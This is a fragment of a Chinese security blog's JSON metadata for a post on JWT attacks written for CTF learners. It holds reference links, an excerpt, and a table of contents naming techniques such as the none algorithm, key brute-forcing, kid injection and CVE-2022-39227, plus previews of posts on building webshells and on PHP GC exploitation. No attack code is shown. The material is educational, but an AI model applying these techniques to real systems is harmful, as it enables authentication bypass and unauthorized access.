href=\"https://www.anquanke.com/post/id/145540#h3-10\">https://www.anquanke.com/post/id/145540#h3-10</a><br><a href=\"https://xz.aliyun.com/t/2338\">https://xz.aliyun.com/t/2338</a><br><a href=\"https://xz.aliyun.com/t/9376#toc-6\">https://xz.aliyun.com/t/9376#toc-6</a><br><a href=\"https://xz.aliyun.com/t/6776#toc-6\">https://xz.aliyun.com/t/6776#toc-6</a><br><a href=\"https://www.4hou.com/posts/zlK2\">https://www.4hou.com/posts/zlK2</a><br><a href=\"https://forum.butian.net/share/1990\">https://forum.butian.net/share/1990</a><br><a href=\"https://www.cnblogs.com/backlion/p/16699442.html\">https://www.cnblogs.com/backlion/p/16699442.html</a></p>\n","feature":true,"text":"声明文章首发于合天安全实验室https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA 前言在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。 JWTJWT，即...","link":"","photos":[],"count_time":{"symbolsCount":"23k","symbolsTime":"21 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"JWT","slug":"JWT","count":1,"path":"api/tags/JWT.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A3%B0%E6%98%8E\"><span class=\"toc-text\">声明</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JWT\"><span class=\"toc-text\">JWT</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Headers\"><span class=\"toc-text\">Headers</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Payload\"><span class=\"toc-text\">Payload</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Signature\"><span class=\"toc-text\">Signature</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JWT-%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">JWT 攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2\"><span class=\"toc-text\">敏感信息泄露</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AE%97%E6%B3%95%E4%BF%AE%E6%94%B9%E6%94%BB%E5%87%BB\"><span class=\"toc-text\">算法修改攻击</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-1\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%AA%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D\"><span class=\"toc-text\">未验证签名</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-2\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%A9%BA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95\"><span class=\"toc-text\">空加密算法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-3\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A5\"><span class=\"toc-text\">爆破密钥</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-4\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Kid%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">Kid参数注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9D%B6%E5%9C%BA%E6%BC%94%E7%A4%BA-5\"><span class=\"toc-text\">靶场演示</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JWT%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B\"><span class=\"toc-text\">JWT攻击实例</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CVE-2022-39227\"><span class=\"toc-text\">CVE-2022-39227</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#CTF%E5%AE%9E%E6%88%98\"><span class=\"toc-text\">CTF实战</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CTFshow%E7%B3%BB%E5%88%97\"><span class=\"toc-text\">CTFshow系列</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web345\"><span class=\"toc-text\">Web345</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web346\"><span class=\"toc-text\">web346</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web347\"><span class=\"toc-text\">Web347</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web348\"><span class=\"toc-text\">Web348</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web349\"><span class=\"toc-text\">Web349</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#web350\"><span class=\"toc-text\">web350</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%A5%A5%E4%BA%91%E6%9D%AF2022-FunWeb\"><span class=\"toc-text\">[祥云杯2022]FunWeb</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun\"><span class=\"toc-text\">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E8%A8%80\"><span class=\"toc-text\">后言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从CTFShow[RCE挑战]中学习自增构造webshell","uid":"882cd13ace786346d67ca526dbf954fe","slug":"从CTFShow[RCE挑战]中学习自增构造webshell","date":"2022-12-07T15:26:30.000Z","updated":"2023-03-14T07:57:46.000Z","comments":true,"path":"api/articles/从CTFShow[RCE挑战]中学习自增构造webshell.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557237.jpeg","text":"前言在CTFShow的每周挑战中遇到了PHP无数字字母构造的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类题进行一个简单总结，希望能对正在学习的师傅有所帮助。 构造语句的几种方式首先来看一下最原始的例题 &lt;?php highlight_file(__FILE__); ...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"CTF","slug":"CTF","count":4,"path":"api/tags/CTF.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析PHP GC垃圾回收机制","uid":"6a30ccf7eba1a3b7e415165a3f83319a","slug":"浅析 PHP GC垃圾回收机制","date":"2022-11-15T13:20:20.000Z","updated":"2023-03-14T07:40:06.000Z","comments":true,"path":"api/articles/浅析 PHP GC垃圾回收机制.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141500019.png","text":"声明文章首发于先知社区https://xz.aliyun.com/t/11843 前言上周战队知识分享时，H3018大师傅讲了PHP GC回收机制的利用，学会了如何去绕过抛出异常。H3018大师傅讲述的很清楚，大家有兴趣的可以去看一下哇，链接如下https://www.bilib...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"14 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"PHP","slug":"PHP","count":1,"path":"api/tags/PHP.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}